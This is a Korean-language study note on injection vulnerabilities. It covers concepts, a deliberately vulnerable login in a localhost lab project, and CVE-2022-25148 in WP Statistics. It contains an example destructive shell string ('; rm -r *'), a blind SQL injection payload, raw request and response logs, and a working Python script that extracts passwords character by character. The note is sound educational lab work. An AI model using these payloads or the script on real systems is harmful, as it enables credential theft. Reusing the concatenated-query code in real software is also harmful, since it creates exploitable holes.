# 개념
---
Injection 취약점은 애플리케이션이 사용자의 입력을 그대로 외부 시스템이나 인터프리터에 전달해 실행하게 되는 취약점을 말한다. 공격자는 이를 악용해 악성 코드 또는 명령을 삽입(injection)할 수 있다.

## 취약점 유형

- 사용자 입력값이 검증 또는 분리 없이 SQL, OS 명령, 스크립트, 표현식 등의 인터프리터로 직접 전달되는 경우
- 입력값에 포함된 SQL 구문, 명령어, 스크립트 코드가 애플리케이션 로직이 아닌 실제 명령으로 해석·실행되는 경우
- 쿼리, 명령어, 템플릿, 표현식 등을 문자열 결합 방식으로 생성하여 외부 입력이 실행 흐름에 영향을 미칠 수 있는 경우
- 입력값에 대한 Prepared Statement, 파라미터 바인딩, 안전한 API를 사용하지 않아 쿼리 구조가 변조될 수 있는 경우
- 에러 메시지, 응답 차이, 처리 시간 등의 변화를 통해 **Blind Injection(SQLi, Command Injection 등)**이 가능한 경우
- 사용자 입력을 기반으로 OS 명령, DB 쿼리, LDAP 쿼리, NoSQL 쿼리, 템플릿 표현식 등을 실행하면서 입력값 검증 또는 컨텍스트별 인코딩이 누락된 경우

## Injection 종류

### OS Command Injection

사용자 입력이 시스템 명령에 그대로 포함될 때 발생한다. 예: `; rm -r *` 같은 문자열을 명령에 넣으면 악성 쉘 명령이 실행될 수 있다.

### SQL Injection

가장 흔하고 위험한 형태로, DB 쿼리에 악성 SQL이 포함되도록 입력을 조작해서 발생한다. 예: `"OR 1=1"` 등을 넣어 인증을 우회하거나 데이터 유출이 가능하다.

### Cross-Site Scripting (XSS)

Injection의 한 종류로, 공격자가 악성 스크립트를 다른 사용자에게 전달하게 하는 기법이다. 해당 스크립트는 세션 탈취, 키로깅, 권한 탈취 등에 악용될 수 있다.


# 프로젝트 적용
---
> thm 주소: ???

## Blind SQL Injection

```jsx
//auth.js
  let { username = '', password = '' } = req.body || {};
  const sql = `
    SELECT id, username, role
    FROM users
    WHERE username='${username}'
    LIMIT 1
 `;
  username = addslashes(username);
  password = addslashes(password);
  const sqli = `
    SELECT id, username, role
    FROM users
    WHERE username='${username}' AND password=MD5('${password}')
    LIMIT 1
 `;
```
- sql에서 username을 먼저 검증하고, addslashes 함수를 입력 값 username, password에 적용하여 sql injection을 우회하도록 설계함.
- 하지만 초기에 username을 검증하는 과정에서 sql injection이 가능하게 되고, Invalid username, Invalid password 라는 반응을 통해 blind sql injection 가능해짐.

## poc

1. 다음과 같이 로그인 과정에서 SQL 구문을 요청 보냄
    **request**
    ```python
    POST /login HTTP/1.1
    Host: localhost:3000
    Content-Length: 64
    sec-ch-ua-platform: "Windows"
    Authorization: Bearer undefined
    X-CSRF-Token: __CSRF_PLACEHOLDER__
    Accept-Language: ko-KR,ko;q=0.9
    sec-ch-ua: "Not_A Brand";v="99", "Chromium";v="142"
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
    Content-Type: application/json
    Accept: */*
    Origin: <http://localhost:3000>
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: <http://localhost:3000/login>
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    
    {"username":"nagox' and length(password)=11#","password":"1234"}
    ```
    
1. ID 검증 과정에서 참/거짓 반응을 확인
    **response**
    - 거짓    
    ```python
    HTTP/1.1 401 Unauthorized
    X-Powered-By: Express
    Content-Type: application/json; charset=utf-8
    Content-Length: 28
    Date: Fri, 21 Nov 2025 06:08:43 GMT
    Connection: keep-alive
    Keep-Alive: timeout=5
    
    {"error":"Invalid username"}
    ```
    
    - 참
    ```jsx
    HTTP/1.1 401 Unauthorized
    X-Powered-By: Express
    Content-Type: application/json; charset=utf-8
    Content-Length: 28
    Date: Fri, 21 Nov 2025 06:08:43 GMT
    Connection: keep-alive
    Keep-Alive: timeout=5
    
    {"error":"Invalid password"}
    ```
    
2. 참/거짓 반응을 활용해 실제 PW값을 구하는 자동화 코드 생성.
    
    **python**
    
    ```python
    import requests
    url ='<http://localhost:3000/login>' #url 주소 입력
    
    def find_pw_len():
        pw_len = 0
        while 1:
            pw_len=pw_len+1
            value ="nagox' and length(password)={}#".format(pw_len) #반복하면서 pw의 글자수를 비교하는 Payload 코드 작성
            data = {
                "username":value,
                "password":"1234"
                }
            response = requests.post(url,json=data)
            if ("Invalid password" in response.text):
                print("길이는? =",pw_len)
                break
            print("시도중 입니다!:",pw_len)
        return pw_len
    
    def find_pw():
        pw_len=find_pw_len()
        string=''
        for pw_value in range(1,pw_len+1):
            for ascii in range(48,122):
                value ="nagox' and ascii(substr(password,{},1))= {}#".format(pw_value,ascii)
                data = {
                    "username":value,
                    "password":"1234"
                    }
                response = requests.post(url, json=data)
                if("Invalid password" in response.text):
                    string =string + chr(ascii)
                    print("pw의 값은!",string)
                    break
    find_pw()
    ```
    

## Blind SQL Injection 1-day

> CVE-2022-25148: WordPress 플러그인 WP Statistics - Blind SQL Injection 워드프레스 플러그인에서 Blind SQL Injection 취약점이 발견되어 플러그인 사용자들에게 보안 업데이트 적용이 권고되었다. 실제로 구버전 플러그인을 노린 대규모 공격 사례들이 발생하고 있으며, 패치가 늦은 사이트에서 데이터 유출·원격 제어·악성코드 삽입 등 심각한 문제가 발생한다.

Note

프로젝트에서는 워드프레스 플러그인 사례와 유사하게 공격자가 로그인하는 과정에서 ID를 검증하는 과정에서 참·거짓 반응을 통한 Blind SQL Injection 공격이 가능하도록 하여 사용자의 비밀번호를 유추할 수 있도록 했다.

취약 코드

wp-statistics/includes/class-wp-statistics-pages.php

```php
225:        $exist = $wpdb->get_row("SELECT `page_id` FROM `" . DB::table('pages') . "` WHERE `date` = '" . TimeZone::getCurrentDate('Y-m-d') . "' " . (array_key_exists("search_query", $current_page) === true ? "AND `uri` = '" . esc_sql($page_uri) . "'" : "") . "AND `type` = '{$current_page['type']}' AND `id` = {$current_page['id']}", ARRAY_A);
```

wp-statistics/includes/class-wp-statistics-visitor.php

```php
79:        $visitor = $wpdb->get_row("SELECT * FROM `" . DB::table('visitor') . "` WHERE `last_counter` = '" . ($date === false ? TimeZone::getCurrentDate('Y-m-d') : $date) . "' AND `ip` = '{$ip}'");
```

- `$page_id`는 POST 파라미터로, 숫자형이라고 가정하지만 아무런 검증이 없다. 따라서 해당 코드에 Blind SQL Injection이 가능하게 되고, DB name, table, column, data 모두 덤프 가능하게 된다.